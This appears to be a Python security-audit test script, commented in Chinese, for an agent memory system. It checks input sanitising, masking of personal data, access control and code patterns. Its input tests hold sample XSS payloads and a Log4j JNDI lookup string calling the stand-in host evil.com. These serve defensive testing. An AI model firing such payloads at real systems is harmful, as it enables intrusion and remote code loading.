#!/usr/bin/env python3
"""
安全审计模块 - 阶段90-92
系统安全审计与加固测试
"""

import sys
import os
import re
from typing import Dict, List, Any
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from src.preprocessing.filter import Preprocessor, PrivacyDesensitizer
from src.governance.privacy_isolation import PrivacyIsolationManager


class SecurityAuditor:
    """安全审计器"""
    
    def __init__(self):
        self.results: List[Dict[str, Any]] = []
        self.passed = 0
        self.failed = 0
        self.vulnerabilities: List[str] = []
    
    def run_all_tests(self) -> Dict[str, Any]:
        """运行所有安全审计"""
        print("=" * 60)
        print("Agent可靠记忆系统 - 安全审计")
        print("=" * 60)
        
        # 输入验证测试
        self._test_input_validation()
        
        # 隐私保护测试
        self._test_privacy_protection()
        
        # 访问控制测试
        self._test_access_control()
        
        # 敏感信息检测
        self._test_sensitive_data_detection()
        
        # 代码安全扫描
        self._scan_code_security()
        
        return self._generate_report()
    
    def _record_result(self, test_name: str, passed: bool, message: str):
        """记录测试结果"""
        self.results.append({
            "test": test_name,
            "passed": passed,
            "message": message,
            "timestamp": datetime.now().isoformat()
        })
        
        if passed:
            self.passed += 1
            status = "✓ 通过"
        else:
            self.failed += 1
            status = "✗ 失败"
            self.vulnerabilities.append(f"{test_name}: {message}")
        
        print(f"  [{status}] {test_name}: {message}")
    
    def _test_input_validation(self):
        """测试输入验证"""
        print("\n[开始] 输入验证测试")
        
        preprocessor = Preprocessor()
        
        # 测试脚本注入
        test_cases = [
            ("<script>alert('xss')</script>", "XSS脚本"),
            ("javascript:alert('xss')", "JavaScript协议"),
            ("<img src=x onerror=alert('xss')>", "图片事件注入"),
            ("${jndi:ldap://evil.com}", "Log4j类注入"),
        ]
        
        for content, desc in test_cases:
            try:
                result = preprocessor.process(content, "security_test")
                # 预期：被标记为无效或内容被清理
                is_safe = not result["is_valid"] or result["content"] != content
                self._record_result(f"{desc}防护", is_safe, 
                                  f"原始长度={len(content)}, 处理后长度={len(result['content'])}")
            except Exception as e:
                self._record_result(f"{desc}防护", True, f"异常捕获: {type(e).__name__}")
    
    def _test_privacy_protection(self):
        """测试隐私保护"""
        print("\n[开始] 隐私保护测试")
        
        desensitizer = PrivacyDesensitizer()
        
        # 测试手机号脱敏
        test_cases = [
            ("我的手机号是13812345678", "138****5678", "手机号"),
            ("联系邮箱test@example.com", "****@example.com", "邮箱"),
            ("身份证号110101199001011234", "110101********1234", "身份证"),
            ("银行卡号6222021234567890123", "622202*********0123", "银行卡"),
        ]
        
        for content, expected_pattern, desc in test_cases:
            try:
                result = desensitizer.desensitize(content)
                # 检查是否包含原始敏感信息
                contains_original = any(sensitive in result for sensitive in 
                                      ["13812345678", "test@example.com", "199001011234"])
                self._record_result(f"{desc}脱敏", not contains_original,
                                  f"原始内容已脱敏")
            except Exception as e:
                self._record_result(f"{desc}脱敏", False, f"异常: {e}")
    
    def _test_access_control(self):
        """测试访问控制"""
        print("\n[开始] 访问控制测试")
        
        privacy_mgr = PrivacyIsolationManager()
        
        # 注册测试数据
        privacy_mgr.register_memory("private_mem", "owner_1", "private")
        privacy_mgr.register_memory("public_mem", "owner_1", "public")
        privacy_mgr.register_memory("shared_mem", "owner_1", "shared", ["user_a"])
        
        # 测试未授权访问
        test_cases = [
            ("private_mem", "attacker", False, "私有内存未授权访问"),
            ("public_mem", "any_user", True, "公开内存正常访问"),
            ("shared_mem", "user_a", True, "共享内存授权访问"),
            ("shared_mem", "user_b", False, "共享内存未授权访问"),
        ]
        
        for mem_id, user_id, expected, desc in test_cases:
            try:
                result = privacy_mgr.can_access(mem_id, user_id)
                self._record_result(desc, result == expected,
                                  f"期望={expected}, 实际={result}")
            except Exception as e:
                self._record_result(desc, False, f"异常: {e}")
        
        # 测试权限提升尝试
        try:
            # 尝试访问不存在的内存（信息泄露测试）
            result = privacy_mgr.can_access("non_existent_memory_id", "any_user")
            self._record_result("不存在内存访问", result == False,
                              "不泄露内存存在性信息")
        except Exception as e:
            self._record_result("不存在内存访问", True, "异常处理正确")
    
    def _test_sensitive_data_detection(self):
        """测试敏感数据检测"""
        print("\n[开始] 敏感数据检测测试")
        
        desensitizer = PrivacyDesensitizer()
        
        # 测试各类敏感信息识别
        patterns = [
            (r"\d{11}", "13800138000", "手机号模式"),
            (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "user@test.com", "邮箱模式"),
            (r"\d{17}[\dXx]", "110101199001011234", "身份证模式"),
        ]
        
        for pattern, test_data, desc in patterns:
            try:
                matches = re.findall(pattern, test_data)
                self._record_result(f"{desc}识别", len(matches) > 0,
                                  f"识别到{len(matches)}个匹配")
            except Exception as e:
                self._record_result(f"{desc}识别", False, f"异常: {e}")
    
    def _scan_code_security(self):
        """代码安全扫描"""
        print("\n[开始] 代码安全扫描")
        
        # 扫描常见安全问题
        security_checks = [
            ("硬编码密码", r"password\s*=\s*['\"][^'\"]+['\"]"),
            ("SQL拼接", r"execute\s*\(\s*['\"].*%s"),
            ("eval使用", r"eval\s*\("),
            ("exec使用", r"exec\s*\("),
        ]
        
        src_dir = os.path.join(os.path.dirname(__file__), "../src")
        issues_found = []
        
        for root, dirs, files in os.walk(src_dir):
            for file in files:
                if file.endswith(".py"):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            content = f.read()
                            for check_name, pattern in security_checks:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                if matches:
                                    issues_found.append(f"{filepath}: 发现{check_name}")
                    except Exception:
                        pass
        
        if issues_found:
            self._record_result("代码安全扫描", False, f"发现{len(issues_found)}个问题")
            for issue in issues_found[:3]:
                print(f"    - {issue}")
        else:
            self._record_result("代码安全扫描", True, "未发现明显安全问题")
    
    def _generate_report(self) -> Dict[str, Any]:
        """生成审计报告"""
        total = self.passed + self.failed
        pass_rate = (self.passed / total * 100) if total > 0 else 0
        
        print("\n" + "=" * 60)
        print("安全审计报告")
        print("=" * 60)
        print(f"总测试数: {total}")
        print(f"通过: {self.passed}")
        print(f"失败: {self.failed}")
        print(f"通过率: {pass_rate:.1f}%")
        
        if self.vulnerabilities:
            print(f"\n发现漏洞 ({len(self.vulnerabilities)}个):")
            for i, vuln in enumerate(self.vulnerabilities[:5], 1):
                print(f"  {i}. {vuln}")
        
        # 安全等级评估
        if pass_rate >= 95 and not self.vulnerabilities:
            level = "A级 - 安全"
        elif pass_rate >= 80:
            level = "B级 - 较安全"
        elif pass_rate >= 60:
            level = "C级 - 需改进"
        else:
            level = "D级 - 不安全"
        
        print(f"\n安全等级: {level}")
        print("=" * 60)
        
        return {
            "total": total,
            "passed": self.passed,
            "failed": self.failed,
            "pass_rate": f"{pass_rate:.1f}%",
            "security_level": level,
            "vulnerabilities": self.vulnerabilities,
            "results": self.results,
            "timestamp": datetime.now().isoformat()
        }


if __name__ == "__main__":
    auditor = SecurityAuditor()
    report = auditor.run_all_tests()
    
    # 返回退出码
    sys.exit(0 if report["failed"] == 0 else 1)
